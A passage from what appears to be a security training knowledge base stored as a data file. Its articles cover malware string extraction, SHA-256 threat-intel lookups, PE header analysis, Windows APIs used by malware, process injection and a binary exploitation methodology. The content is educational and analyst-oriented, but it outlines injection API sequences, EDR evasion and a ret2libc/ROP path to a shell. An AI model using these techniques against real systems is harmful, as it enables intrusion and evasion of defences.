s[0] = 'c'; s[1] = 'm'; s[2] = 'd'; s[3] = '.';
s[4] = 'e'; s[5] = 'x'; s[6] = 'e'; s[7] = '\\0';
\`\`\`
FLOSS emulates this and recovers \`cmd.exe\`

### XOR-Encoded Strings
\`\`\`c
char encoded[] = {0x2C, 0x37, 0x37, 0x30, 0x1A}; // XOR 0x5C = "http:"
for(int i=0; i<5; i++) encoded[i] ^= 0x5C;
\`\`\`
FLOSS tries common XOR keys and recovers the plaintext

### RC4 / Custom Encrypted Strings
More complex decryption routines — FLOSS emulates the decoder function to recover strings

---

## 6. Advanced String Techniques

### Extract Strings from Specific PE Sections
\`\`\`bash
# Only .rdata section (constants, string literals)
objdump -s -j .rdata malware.exe | strings

# Only .data section (global variables)
objdump -s -j .data malware.exe | strings

# Resource section (often contains payloads)
objdump -s -j .rsrc malware.exe | strings
\`\`\`

### String Diffing Between Samples
\`\`\`bash
# Compare strings between two variants
floss variant_a.exe > strings_a.txt
floss variant_b.exe > strings_b.txt
diff strings_a.txt strings_b.txt

# Or use comm to find unique/common strings
sort strings_a.txt > a_sorted.txt
sort strings_b.txt > b_sorted.txt
comm -12 a_sorted.txt b_sorted.txt > common_strings.txt  # Shared
comm -23 a_sorted.txt b_sorted.txt > only_in_a.txt        # Unique to A
\`\`\`

### Strings in Memory Dumps
\`\`\`bash
# Extract strings from a memory dump
strings -n 10 memory_dump.dmp > mem_strings.txt

# Search for specific patterns in memory
strings memory_dump.dmp | grep -iE "(password|http|cmd\\.exe)"
\`\`\`

---

## 7. Related Tools

| Tool | Description | Use Case |
|---|---|---|
| **FLOSS** | Deobfuscating string solver | Primary tool for malware strings |
| **strings** | Basic string extraction | Quick first pass |
| **Bstrings** (Eric Zimmerman) | Enhanced strings for Windows | Better Unicode, regex support |
| **binwalk** | Firmware/embedded file analysis | Find embedded files & strings |
| **foremost** | File carving | Extract files from binary blobs |
| **yara** | Pattern matching | Scan for known string signatures |
| **StringSifter** | ML-based string ranking | Prioritize interesting strings |

### StringSifter — AI-Powered String Ranking
\`\`\`bash
# Ranks strings by maliciousness likelihood
pip install stringsifter
floss sample.exe | rank_strings
# Output: most suspicious strings first
\`\`\`

---

## Pro Tips

> **Always run FLOSS, not just \`strings\`** — You'll miss 30-50% of interesting strings with the basic \`strings\` command.

> **Check FLOSS decoded strings section** — The bottom section labeled "FLOSS decoded strings" and "FLOSS stack strings" contains the real gold — these are strings the malware tried to hide.

> **Pipe to \`less\` or save to file** — Large binaries can have thousands of strings. Save output and search systematically.

> **Combine with entropy analysis** — High-entropy sections with few strings = likely packed/encrypted. Low-entropy sections are worth deep string analysis.`},{id:`sha256-check`,title:`SHA-256 Hash Verification`,excerpt:`Using SHA256 hashes for malware sample verification and identification, including cross-referencing with threat intelligence databases.`,category:`Malware Analysis`,content:`# SHA-256 Hash Verification

> **Purpose**: Generate the industry-standard cryptographic fingerprint of a file — the **gold standard** for malware identification.

---

## 1. Quick Commands

### Windows (Cmder / PowerShell)
\`\`\`powershell
# Using sha256sum (Cmder / Git Bash / WSL)
sha256sum.exe FileName.exe

# Using PowerShell native (default algorithm IS SHA256)
Get-FileHash FileName.exe

# Using certutil
certutil -hashfile FileName.exe SHA256
\`\`\`

### Linux / macOS
\`\`\`bash
# Standard
sha256sum FileName.exe

# macOS
shasum -a 256 FileName.exe

# OpenSSL
openssl dgst -sha256 FileName.exe
\`\`\`

---

## 2. What is SHA-256?

- **SHA-256** (Secure Hash Algorithm 256-bit) is part of the SHA-2 family designed by the NSA
- Produces a **256-bit** (64 hex character) hash
- Published by NIST in 2001
- **No known collisions** — cryptographically secure as of 2025
- Used in Bitcoin, SSL/TLS certificates, digital signatures, and malware identification

### Example Output
\`\`\`
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  empty_file.txt
2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824  hello.txt
9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08  malware_sample.exe
\`\`\`

---

## 3. SHA-256 — The Authoritative Identifier

SHA-256 is the **primary hash** used across the entire threat intelligence ecosystem:

| Platform / Tool | Primary Hash | Notes |
|---|---|---|
| **VirusTotal** | SHA-256 | Primary lookup key, URL format uses SHA-256 |
| **MISP** | SHA-256 | Threat intelligence sharing standard |
| **YARA** | SHA-256 | Hash matching in rules |
| **MalwareBazaar** | SHA-256 | Primary identifier in API |
| **ClamAV** | SHA-256 | Signature database |
| **STIX/TAXII** | SHA-256 | Standard IOC indicator |
| **Sigma rules** | SHA-256 | File hash detection |

---

## 4. Complete Hashing Workflow for Malware Analysis

### Step 1: Generate All Hashes
\`\`\`bash
# Generate MD5, SHA-1, and SHA-256 in one go
echo "=== File Identification ==="
echo "Filename: $(basename malware.exe)"
echo "Size:     $(stat -c %s malware.exe) bytes"
echo "MD5:      $(md5sum malware.exe | awk '{print $1}')"
echo "SHA-1:    $(sha1sum malware.exe | awk '{print $1}')"
echo "SHA-256:  $(sha256sum malware.exe | awk '{print $1}')"
echo "File:     $(file malware.exe)"
\`\`\`

### Step 2: VirusTotal Lookup
\`\`\`bash
# Direct URL format (open in browser)
# https://www.virustotal.com/gui/file/<SHA256_HASH>

# Using VT API (requires API key)
curl -s "https://www.virustotal.com/api/v3/files/<SHA256_HASH>" \\
  -H "x-apikey: YOUR_API_KEY" | python3 -m json.tool
\`\`\`

### Step 3: Automated Multi-Platform Lookup
\`\`\`python
#!/usr/bin/env python3
"""Quick hash lookup across multiple platforms"""
import hashlib
import sys

def hash_file(filepath):
    """Generate all hashes for a file"""
    md5 = hashlib.md5()
    sha1 = hashlib.sha1()
    sha256 = hashlib.sha256()
    
    with open(filepath, 'rb') as f:
        while chunk := f.read(8192):
            md5.update(chunk)
            sha1.update(chunk)
            sha256.update(chunk)
    
    return {
        'md5': md5.hexdigest(),
        'sha1': sha1.hexdigest(),
        'sha256': sha256.hexdigest()
    }

if __name__ == '__main__':
    hashes = hash_file(sys.argv[1])
    print(f"MD5:    {hashes['md5']}")
    print(f"SHA-1:  {hashes['sha1']}")
    print(f"SHA-256:{hashes['sha256']}")
    print(f"\\nVirusTotal: https://www.virustotal.com/gui/file/{hashes['sha256']}")
    print(f"MalwareBazaar: https://bazaar.abuse.ch/sample/{hashes['sha256']}/")
    print(f"Hybrid Analysis: https://www.hybrid-analysis.com/search?query={hashes['sha256']}")
\`\`\`

---

## 5. Hash Databases & Threat Intelligence

### Known-Good Hash Databases (Whitelisting)
| Database | Description |
|---|---|
| **NSRL** (NIST) | National Software Reference Library — hashes of known legitimate software |
| **HashSets.com** | Community hash sets for known files |
| **WinTriage** | Windows system file hashes |

### Known-Bad Hash Databases (Blacklisting)
| Database | URL | Description |
|---|---|---|
| **MalwareBazaar** | [bazaar.abuse.ch](https://bazaar.abuse.ch) | Community malware repo with SHA-256 |
| **MalShare** | [malshare.com](https://malshare.com) | Free samples by hash |
| **VirusShare** | [virusshare.com](https://virusshare.com) | Massive hash lists |
| **ThreatFox** | [threatfox.abuse.ch](https://threatfox.abuse.ch) | IOCs including hashes |

---

## 6. OSINT Hash Pivoting

When you have a SHA-256 hash, pivot to discover the full attack chain:

\`\`\`
SHA-256 Hash
    ├── VirusTotal "Relations" Tab
    │   ├── Contacted Domains → DNS history → related campaigns
    │   ├── Contacted IPs → geo-location → infrastructure mapping
    │   ├── Dropped Files → child payload hashes → next stages
    │   ├── Parent Files → dropper/loader that delivered this
    │   └── Execution Parents → process chain
    ├── MalwareBazaar
    │   ├── Family tags → malware family identification
    │   ├── Reporter → who submitted it
    │   └── Related samples → same campaign
    ├── ANY.RUN
    │   ├── Full behavioral report
    │   ├── Network traffic (PCAP)
    │   └── Process tree
    └── Hybrid Analysis
        ├── Sandbox report
        ├── Extracted strings
        └── MITRE ATT&CK mapping
\`\`\`

---

## 7. Verifying File Integrity

### Use Case: Verify a Download
\`\`\`bash
# Download a tool and verify its hash
wget https://example.com/tool.tar.gz
wget https://example.com/tool.tar.gz.sha256

# Verify
sha256sum -c tool.tar.gz.sha256
# Expected output: tool.tar.gz: OK
\`\`\`

### Use Case: Verify Evidence Integrity (Forensics)
\`\`\`bash
# At acquisition time
sha256sum disk_image.dd > evidence_hash.txt

# Before analysis
sha256sum -c evidence_hash.txt
# If OK → evidence is unmodified
# If FAILED → evidence was tampered with
\`\`\`

---

## 8. Hash Comparison Table

| Algorithm | Bits | Hex Chars | Collision Resistance | Speed | Use Case |
|---|---|---|---|---|---|
| **MD5** | 128 | 32 | **Broken** | Fastest | Quick lookups only |
| **SHA-1** | 160 | 40 | **Broken** (2017) | Fast | Legacy, avoid for security |
| **SHA-256** | 256 | 64 | **Strong** | Medium | Primary identifier (use this) |
| **SHA-512** | 512 | 128 | **Strong** | Slower | Maximum security needs |
| **SSDEEP** | Fuzzy | Variable | N/A (similarity) | Slow | Find similar (not identical) files |
| **TLSH** | Fuzzy | 72 | N/A (similarity) | Medium | Fuzzy matching malware variants |

---

## Pro Tips

> **Always use SHA-256 as your primary identifier** — It's the industry standard, all platforms accept it, and it's cryptographically secure.

> **Generate hashes BEFORE opening the file** — Opening in analysis tools might modify timestamps or trigger AV that quarantines the file.

> **Fuzzy hashes (SSDEEP/TLSH) complement exact hashes** — Use \`ssdeep -b malware_*.exe\` to find variants of the same malware family even when the SHA-256 is different.

> **Automate hashing in your workflow** — Create an alias: \`alias hashit='md5sum $1 && sha256sum $1 && ssdeep $1'\``},{id:`process-injection`,title:`PROCESS INJECTION`,excerpt:`Comprehensive overview of process injection techniques including DLL injection, process hollowing, APC injection, and thread execution hijacking.`,category:`Malware Analysis`,content:`**Process injection** = the #1 most common technique used by modern Windows malware to **hide itself inside a legitimate process**.

Instead of running as its own obvious malicious evil.exe, the attacker forces a trusted process (e.g. explorer.exe, svchost.exe, msedge.exe, lsass.exe, etc.) to execute the malicious code. From the outside, everything looks normal — Task Manager, EDR, antivirus only see a legitimate process using a bit more memory or network.

### Why attackers do it (the real reasons in 2025)

|Goal|How injection helps|
|---|---|
|Evade AV/EDR|Legitimate process → often whitelisted|
|Steal tokens & escalate privileges|Inject into lsass → dump credentials|
|Survive reboots & hide|Live only in memory, nothing on disk|
|Bypass allow-lists|notepad.exe or Microsoft-signed binary now runs evil code|
|Hide network traffic|C2 comes from chrome.exe or svchost.exe|

### Top 8 Process Injection Techniques You Will See Daily (2025 ranking)

|#|Technique|How it works (very short)|Most common malware using it (2025)|Difficulty to detect|
|---|---|---|---|---|
|1|Classic DLL Injection|VirtualAllocEx → WriteProcessMemory → CreateRemoteThread (LoadLibrary)|Lumma, RedLine, SmokeLoader, most stealers|Low–Medium|
|2|Process Hollowing (RunPE)|Start legitimate exe suspended → unmap → write malicious PE → resume|Qakbot, TrickBot, Bumblebee, Dridex forks|Medium|
|3|Reflective DLL Injection|Malicious DLL has no LoadLibrary, it injects & executes itself in memory|Cobalt Strike, Brute Ratel, most red-team tools|High|
|4|Process Doppelgänging|Abuse NTFS transactions to load malicious PE without touching disk|Rare in commodity, some APT|Very High|
|5|Thread Execution Hijacking|Suspend legitimate thread → hollow its context → resume with malicious code|Emotet (old), some private crypters|High|
|6|APC Injection|Queue APC (asynchronous procedure call) to thread in target process|AsyncRAT, many .NET stealers|Medium|
|7|EarlyBird APC Injection|Queue APC while process is still suspended (before main thread runs)|Newer stealers & loaders|High|
|8|Direct Syscalls + NtMapViewOfSection|Map malicious section into another process (bypasses most EDR hooks)|Sliver, modern Cobalt forks, high-end malware|Very High|

### The Classic DLL Injection Step-by-Step (the one you see 50× per week)

1. Open target process (OpenProcess or NtOpenProcess)
2. Allocate memory in target (VirtualAllocEx)
3. Write malicious DLL path or shellcode (WriteProcessMemory)
4. Force target to load/run it (CreateRemoteThread → LoadLibrary or shellcode address)
5. Malicious code now runs inside explorer.exe, svchost.exe, etc.

### How to spot it instantly in your lab (2025)

|Tool|What you look for|
|---|---|
|PE-bear / CFF|Imports: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread|
|x64dbg|Breakpoints on those APIs → see if process handle ≠ itself|
|ProcMon|Process = explorer.exe doing WriteProcessMemory or LoadImage on weird DLL|
|Process Hacker|Right-click process → “Memory” tab → look for RX + W pages (shellcode) or weird DLLs|
|HollowsHunter / PE-sieve|Automatically flags hollowed processes & injected sections|
|Moneta / Hunt|Sysmon Event ID 8 (CreateRemoteThread) + Event ID 10 (memory access)|

### Quick verdict checklist (when you see a new sample)

|You see these imports →|Verdict|
|---|---|
|VirtualAllocEx + WriteProcessMemory + CreateRemoteThread|99% injection|
|Only Nt* versions of the above|Advanced injection (direct syscalls)|
|No suspicious imports but high network from svchost.exe|Reflective / memory-only injection|`},{id:`pe-headers`,title:`PE Header Analysis`,excerpt:`Analyzing Portable Executable headers including DOS header, COFF header, optional header, section tables, Import Address Table, and detecting packed binaries.`,category:`Malware Analysis`,content:`# PE Header Analysis

> **Purpose**: Analyze the structure of Windows executables (PE format) to identify compilation details, packing, suspicious characteristics, and behavioral indicators — all before running the file.

---

## 1. Tools for PE Analysis

### Quick Setup
1. **PE-bear** — Open PE-bear → File → Load PEs → drop executable
2. **PEAnatomist** — Drop file into PEAnatomist for detailed timestamp and header analysis
3. **CFF Explorer** — Full PE editor with hex view and structure browser
4. **pestudio** — Automated PE analysis with threat indicators
5. **Detect It Easy (DiE)** — Packer/compiler detection, entropy visualization

### All Necessary Information
All header info, imports, resources, and debug info are visible on the main screen of PE-bear.

---

## 2. PE File Format Structure

\`\`\`
+-----------------------------+
|       DOS Header            |  <- Starts with "MZ" (0x4D 0x5A)
|       (64 bytes)            |
+-----------------------------+
|       DOS Stub              |  <- "This program cannot be run in DOS mode"
|       (Variable)            |
+-----------------------------+
|       PE Signature          |  <- "PE\\0\\0" (0x50 0x45 0x00 0x00)
+-----------------------------+
|       COFF File Header      |  <- Machine type, number of sections, timestamp
|       (20 bytes)            |
+-----------------------------+
|     Optional Header         |  <- Entry point, image base, subsystem
|     (PE32: 96 + data dirs)  |
|     (PE32+: 112 + data dirs)|
+-----------------------------+
|     Section Headers         |  <- .text, .data, .rdata, .rsrc, etc.
|     (40 bytes each)         |
+-----------------------------+
|     Section Data            |
|     .text (code)            |
|     .rdata (read-only data) |
|     .data (global vars)     |
|     .rsrc (resources)       |
|     .reloc (relocations)    |
+-----------------------------+
\`\`\`

---

## 3. DOS Header

- **MZ** on the blue screen or \`4D 5A\` on the white sheet (hex view) = it is an executable file
- The DOS header is a legacy structure from MS-DOS — the only important field is:
  - \`e_lfanew\` (offset 0x3C) -> points to the PE signature

### Quick Check
\`\`\`
If first 2 bytes = "MZ" (0x4D 0x5A) -> Valid PE file
If e_lfanew points to "PE\\0\\0" -> Valid PE header found
\`\`\`

---

## 4. COFF File Header (IMAGE_FILE_HEADER)

| Field | Offset | Meaning | Malware Relevance |
|---|---|---|---|
| **Machine** | 0x00 | Target architecture | \`0x14C\` = x86, \`0x8664\` = x64 |
| **NumberOfSections** | 0x02 | How many sections | Unusual count = suspicious |
| **TimeDateStamp** | 0x04 | Compilation timestamp | When was it compiled? Fake? Future? |
| **PointerToSymbolTable** | 0x08 | Symbol table offset | Usually 0 for release builds |
| **NumberOfSymbols** | 0x0C | Symbol count | Usually 0 |
| **SizeOfOptionalHeader** | 0x10 | Optional header size | Varies by PE32/PE32+ |
| **Characteristics** | 0x12 | File attributes | DLL flag, executable, etc. |

### Timestamp Analysis
\`\`\`
PEAnatomist -> File Header section -> TimeDateStamp

Things to check:
- Is the timestamp realistic? (not year 1970 or 2038)
- Is it in the future? (forgery)
- Does it match other samples in the campaign?
- Is it 0x00000000? (stripped)
- Epoch converter: https://www.epochconverter.com/
\`\`\`

---

## 5. Optional Header (Key Fields)

| Field | Meaning | Malware Relevance |
|---|---|---|
| **Magic** | \`0x10B\` = PE32, \`0x20B\` = PE32+ (64-bit) | Architecture identification |
| **AddressOfEntryPoint** | RVA where execution begins | Unusual location -> packed/injected |
| **ImageBase** | Preferred load address | Default: \`0x400000\` (exe), \`0x10000000\` (DLL) |
| **SectionAlignment** | Memory alignment | Usually \`0x1000\` (4KB) |
| **FileAlignment** | Disk alignment | Usually \`0x200\` (512 bytes) |
| **SizeOfImage** | Total memory size | Must match actual sections |
| **Subsystem** | GUI=2, Console=3, Driver=1 | What type of executable |
| **DllCharacteristics** | Security features | ASLR, DEP/NX, CFG, SEH flags |
| **NumberOfRvaAndSizes** | Data directory count | Usually 16 |

### DllCharacteristics Security Flags
| Flag | Value | Meaning |
|---|---|---|
| \`IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE\` | \`0x0040\` | ASLR enabled |
| \`IMAGE_DLLCHARACTERISTICS_NX_COMPAT\` | \`0x0100\` | DEP/NX enabled |
| \`IMAGE_DLLCHARACTERISTICS_NO_SEH\` | \`0x0400\` | No SEH (Structured Exception Handling) |
| \`IMAGE_DLLCHARACTERISTICS_GUARD_CF\` | \`0x4000\` | Control Flow Guard enabled |

> Malware with **no security flags** = compiled without protections (intentional or old compiler)

---

## 6. Section Headers (IMAGE_SECTION_HEADER)

### Standard Sections
| Section | Purpose | Expected Characteristics |
|---|---|---|
| \`.text\` | Executable code | \`IMAGE_SCN_MEM_EXECUTE\` + \`IMAGE_SCN_MEM_READ\` |
| \`.rdata\` | Read-only initialized data, imports | \`IMAGE_SCN_MEM_READ\` |
| \`.data\` | Read-write initialized data | \`IMAGE_SCN_MEM_READ\` + \`IMAGE_SCN_MEM_WRITE\` |
| \`.bss\` | Uninitialized data | \`IMAGE_SCN_MEM_READ\` + \`IMAGE_SCN_MEM_WRITE\` |
| \`.rsrc\` | Resources (icons, dialogs, version) | \`IMAGE_SCN_MEM_READ\` |
| \`.reloc\` | Relocation data (for ASLR) | \`IMAGE_SCN_MEM_READ\` |

### Suspicious Section Indicators
| Indicator | What It Means |
|---|---|
| Section with \`RWX\` (Read+Write+Execute) | Self-modifying code or shellcode unpacking |
| Unknown section names (\`.upx0\`, \`.aspack\`) | Known packer sections |
| Entry point outside \`.text\` section | Packed -- stub in different section |
| \`.text\` section is \`WRITE\`able | Self-modifying code |
| Very high entropy in a section (>7.0) | Compressed or encrypted content |
| Huge gap between VirtualSize and RawSize | Packer will expand data in memory |

---

## 7. Packed Binary Detection

- If the **size of raw data** is almost equal to the **virtual size** (IMAGE_SECTION_HEADER .text) then it is **not a packed binary**
- A **packed binary** is a normal Windows PE executable (.exe, .dll, .sys, etc.) that has been **compressed or encrypted** by a special tool called a **packer** (or **crypter/protector**)

### What Happens When You Run a Packed Binary
1. The packed file is very small or looks like random/garbage data
2. At runtime, a small piece of code (the **stub** or **unpacking stub**) executes first
3. This stub **decompresses or decrypts** the real original program in memory
4. The stub then jumps to the real program's original entry point (OEP) and the malware runs normally

### Packing Detection Checklist
\`\`\`
[ ] Virtual Size >> Raw Size for .text section? -> PACKED
[ ] Entry point in unusual section (not .text)? -> PACKED  
[ ] Very few imports (only LoadLibrary/GetProcAddress)? -> PACKED
[ ] Section names match known packers? -> PACKED
[ ] High entropy (>7.0) across sections? -> PACKED
[ ] Few/no meaningful strings? -> PACKED
[ ] Detect It Easy / PEiD identifies a packer? -> PACKED
\`\`\`

### Common Packers & Their Signatures
| Packer | Section Names | Other Indicators |
|---|---|---|
| **UPX** | \`.UPX0\`, \`.UPX1\` | \`UPX!\` magic at end of file |
| **ASPack** | \`.aspack\`, \`.adata\` | ASPack string in overlay |
| **Themida / WinLicense** | \`.themida\` | Virtualized code |
| **VMProtect** | \`.vmp0\`, \`.vmp1\` | Code virtualization |
| **PECompact** | \`.pec\`, PECompact header | PECompact2 string |
| **MPRESS** | \`.MPRESS1\`, \`.MPRESS2\` | Similar to UPX |
| **Enigma Protector** | \`.enigma1\`, \`.enigma2\` | Anti-debug, anti-dump |

---

## 8. Import Address Table (IAT) Analysis

The IAT lists all DLL functions the binary imports:

### What to Check
\`\`\`
PE-bear -> Imports tab
  -> Which DLLs are imported?
  -> Which functions from each DLL?
  -> Do the imports match the claimed functionality?
\`\`\`

### Red-Flag Import Patterns
| Pattern | Interpretation |
|---|---|
| Only \`kernel32.dll\` with \`LoadLibrary\` + \`GetProcAddress\` | Dynamic resolution -- hiding real imports |
| \`ws2_32.dll\` + \`wininet.dll\` imports | Network communication |
| \`crypt32.dll\` imports | Encryption/decryption |
| \`VirtualAllocEx\` + \`WriteProcessMemory\` | Process injection |
| No imports at all | Heavily packed or uses syscalls |
| \`ntdll.dll\` Nt* functions | Direct syscalls, EDR evasion |

---

## 9. Resources Section (.rsrc)

Resources can contain:
- **Icons** -- Social engineering (mimicking legitimate software)
- **Version info** -- Fake publisher, product name
- **Embedded binaries** -- Payloads hidden in resources
- **Configuration data** -- Encrypted C2 config
- **Dialogs** -- Ransom notes, fake error messages

### Tools for Resource Analysis
| Tool | Use |
|---|---|
| **Resource Hacker** | View/extract/edit all resources |
| **PE-bear** | Resources tab shows resource tree |
| **7-Zip** | Can open PE resources as archive |
| **binwalk** | Find embedded files in resources |

---

## 10. Data Directories

| Index | Name | Malware Relevance |
|---|---|---|
| 0 | Export Table | DLL exports (check for suspicious function names) |
| 1 | Import Table | IAT -- critical for behavior analysis |
| 2 | Resource Table | Embedded payloads, configs |
| 5 | Base Relocation | Needed for ASLR |
| 6 | Debug | PDB path -> developer machine info |
| 11 | Bound Import | Rarely used -- if present, suspicious |
| 12 | IAT | Runtime import resolution |
| 14 | CLR Runtime Header | .NET binary indicator |

### Debug Directory -- Developer Info Leak
\`\`\`
The PDB (Program Database) path can leak:
- Developer username
- Project folder structure
- Development machine OS  
- Build environment

Example: C:\\Users\\attackerName\\Desktop\\malware_project\\Release\\payload.pdb
\`\`\`

---

## 11. Quick PE Analysis Checklist

\`\`\`
[ ] 1. Verify MZ header (is it actually a PE file?)
[ ] 2. Check architecture (x86 vs x64)
[ ] 3. Read timestamp (when compiled?)
[ ] 4. Check entry point location (in .text? -> normal)
[ ] 5. Examine sections (names, sizes, entropy, permissions)
[ ] 6. Detect packing (VirtualSize vs RawSize, entropy, DiE)
[ ] 7. Analyze imports (which APIs? -> predict behavior)
[ ] 8. Check resources (embedded files? fake version info?)
[ ] 9. Look for debug info (PDB path leak?)
[ ] 10. Check DLL characteristics (security flags)
[ ] 11. Calculate hashes (MD5/SHA256) -> VirusTotal lookup
[ ] 12. Run through pestudio for automated indicators
\`\`\`

---

## Pro Tips

> **Use pestudio for automated first-pass** -- It highlights suspicious imports, strings, and sections with color-coded indicators. Best initial triage tool.

> **Entropy is your packing detector** -- Normal \`.text\` section: ~6.0 entropy. Packed/encrypted: ~7.5+. Use DiE for visual entropy graphs.

> **Fake timestamps are common** -- Malware authors often set timestamps to 0, far in the past, or match legitimate software timestamps. Never trust timestamps alone.

> **Resources hide payloads** -- Many malware families (Emotet, QakBot) embed encrypted payloads in the PE resource section, decoded at runtime.
`},{id:`windows-api`,title:`WINDOWS API`,excerpt:`Reference guide for Windows API functions commonly encountered in malware analysis, covering kernel32.dll, ntdll.dll, and user32.dll function families.`,category:`Malware Analysis`,content:`The **Windows API** (Application Programming Interface) is simply the **official set of functions** that Microsoft provides so that programs (normal software and malware alike) can interact with the Windows operating system.

Think of it as the **only legal way** a program can ask Windows to do anything useful: create a file, start a process, open a network connection, press a key, hide a window, etc.

Every piece of Windows malware you will ever analyze uses the Windows API — there is no other way.

### 1. Where does the Windows API live?

| DLL (Dynamic Link Library)    | What it contains – most important for malware         |
| ----------------------------- | ----------------------------------------------------- |
| **kernel32.dll**              | File, process, thread, memory, handles – the core     |
| **user32.dll**                | Windows, messages, keyboard/mouse, GUI stuff          |
| **advapi32.dll**              | Registry, services, privileges, crypto                |
| **ntdll.dll**                 | Low-level NT system calls (the real kernel interface) |
| **ws2_32.dll / wininet.dll**  | Network: sockets, HTTP, DNS                           |
| **shell32.dll / shlwapi.dll** | Shell operations, file shortcuts, URLs                |
| **ole32.dll / oleaut32.dll**  | COM, automation, often used for Office macros         |
| **winhttp.dll**               | Modern HTTPS (common in 2024–2025 malware)            |
| **crypt32.dll**               | Certificate functions (often abused)                  |

### 2. Two ways programs call the Windows API

|Method|What you see in static analysis|What you see when running|
|---|---|---|
|**Dynamic linking** (99% of normal programs & most malware)|Clear Import Address Table (IAT) with function names: CreateFileA, WriteProcessMemory, RegSetValueEx, etc.|Easy to see in ProcMon, API monitors|
|**Dynamic / manual loading** (common evasion technique)|No imported names, or only LoadLibrary + GetProcAddress|At runtime it loads the DLL and resolves functions manually → hides real API usage from static tools|

### 3. The Most Important Windows API Functions You Will See in Malware (2025 hit list)

|Category|API Function|What malware uses it for|
|---|---|---|
|Process Injection|VirtualAllocEx, WriteProcessMemory, CreateRemoteThread|Classic DLL/code injection|
||NtMapViewOfSection, NtCreateThreadEx (ntdll)|Stealthier injection (direct syscalls)|
|Persistence|RegCreateKeyEx, RegSetValueEx|Writes to HKCU\\Run, HKLM\\Run, etc.|
||CreateService, StartService|Installs itself as service|
|File Operations|CreateFile, WriteFile, CopyFile|Drops payload, ransomware encryption|
||URLDownloadToFile, WinHttpOpen|Downloads next stage|
|Network|socket, connect, WSAConnect|Raw sockets (ws2_32)|
||InternetOpen, HttpOpenRequest|Old wininet style C2|
||WinHttpConnect, WinHttpSendRequest|Modern HTTPS C2 (2023–2025)|
|Anti-Analysis|IsDebuggerPresent, CheckRemoteDebuggerPresent|Detects if being debugged|
||NtQueryInformationProcess|ProcessDebugPort, ProcessDebugObjectHandle|
||GetTickCount, QueryPerformanceCounter → XOR check|Timing checks against sandboxes|
|Privilege Escalation|LookupPrivilegeValue, AdjustTokenPrivileges|Enables SeDebugPrivilege, SeImpersonate, etc.|
|Evasion|LoadLibrary, GetProcAddress|Dynamic API resolution (hides real functions)|
||NtOpenProcess, NtReadVirtualMemory|Direct syscall versions (bypasses API hooks)|
|Hiding|SetWindowsHookEx, RegisterHotKey|Keylogger or persistence|
||CreateMutex, OpenMutex|Singleton check (only one instance)|

### 4. How malware hides Windows API usage (2025 techniques)

|Technique|What it looks like in tools|
|---|---|
|Direct syscalls|Calls ntdll functions with syscall numbers instead of using kernel32|
|API hashing|Hashes function names at runtime, resolves via GetProcAddress|
|String encryption|All API and DLL names are encrypted/obfuscated|
|Reflective DLL injection|No LoadLibrary on disk, everything in memory|
|Syscall stubbing|Malware contains its own syscall stubs (e.g., Tartarus Gate, SysWhispers)|

### 5. Quick cheat sheet for daily malware analysis

When you open a sample in PE-bear, x64dbg, or IDA, ask yourself these questions:

1. Does it import suspicious APIs? → CreateRemoteThread + WriteProcessMemory = almost certainly injection
2. Does it only import LoadLibrary + GetProcAddress? → It’s doing dynamic resolution (common evasion)
3. Does it import a lot of Nt* functions from ntdll? → Probably doing direct syscalls to evade EDR hooks
4. Does it import networking APIs but no URLs visible? → Domain generation algorithm (DGA) or encrypted config
5. Does it import VirtualAlloc + CreateThread + WinHttp*? → Typical downloader → shellcode → next-stage pattern`},{id:`binary-exploitation-methodology`,title:`Binary Exploitation Methodology`,excerpt:`Complete methodology for approaching binary exploitation challenges, from initial reconnaissance through vulnerability identification to working exploit development.`,category:`Binary Exploitation`,content:`# Binary Exploitation Methodology
> Sources: [HackTricks - Binary Exploitation](https://book.hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/index.html) | [Crypto-Cat CTF/pwn](https://github.com/Crypto-Cat/CTF/tree/main/pwn)

---

## Overview - Exploitation Flow

\`\`\`
1. Identify vulnerability (overflow, format string, etc.)
2. Determine protections (checksec)
3. Find offset to control EIP/RIP
4. Choose exploitation technique based on protections
5. Build payload & get shell
\`\`\`

---

## Step 1: Recon & Binary Analysis

\`\`\`bash
# Check binary protections
checksec --file=./binary

# File type
file ./binary

# Strings
strings ./binary | grep -i flag
strings ./binary | grep -i bin/sh

# Trace library/system calls
ltrace ./binary
strace ./binary

# Disassemble
objdump -d ./binary | less
\`\`\`

### ELF Basic Info
- **ELF** = Executable and Linkable Format (Linux binaries)
- Sections: \`.text\` (code), \`.data\` (initialized data), \`.bss\` (uninitialized), \`.got\` (Global Offset Table), \`.plt\` (Procedure Linkage Table)
- GOT/PLT used for dynamic linking → key targets for exploitation

---

## Step 2: Controlling Execution Flow

### Ways to hijack control flow:
1. **Stack Overflow** → overwrite saved return address (EIP/RIP)
2. **Format String** → arbitrary read/write via \`printf\` misuse
3. **Array Indexing** → abuse poorly bounds-checked indexing
4. **Integer Overflow** → cause unexpected allocation sizes → heap/stack overflow
5. **Heap Exploitation** → corrupt heap metadata for arbitrary write

---

## Step 3: Choose Exploitation Goal

### Goal A: Call an Existing Function (ret2win)
- No PIE, no canary → just overwrite return address with function address
- With PIE → need a PIE leak first
- With canary → need canary leak/bypass
- Need params? → use ROP gadgets or SROP

### Goal B: Remote Code Execution (RCE)

#### Via Shellcode (NX disabled):
- Place shellcode on stack → jump to it
- No ASLR → hardcode stack address
- With ASLR → use \`ret2esp\` / \`ret2reg\` gadgets
- With NX → use ROP to call \`mprotect()\` → make region executable → jump to shellcode

#### Via Syscall:
- \`ret2syscall\` → set up \`execve("/bin/sh", NULL, NULL)\` via ROP
- SROP → use \`sigreturn\` to set all registers at once

#### Via Libc (ret2libc):
- Call \`system("/bin/sh")\` using libc addresses
- No ASLR → static addresses
- With ASLR → leak libc address from GOT, calculate offsets
- Unknown libc? → leak 2+ function addresses → identify version via [libc.blukat.me](https://libc.blukat.me/) or [libc.rip](https://libc.rip/)

#### Via EBP/RBP (Stack Pivoting):
- Control ESP through stored EBP
- Useful for off-by-one overflows

---

## Step 4: Eternal Loops (Re-exploitation)

When one exploitation isn't enough:
- ROP chain back to \`main\` or vulnerable function
- Overwrite \`exit()\` GOT entry → point back to vulnerability
- Use \`.fini_array\` → store function pointer to loop back

---

## Compilation Flags for Practice

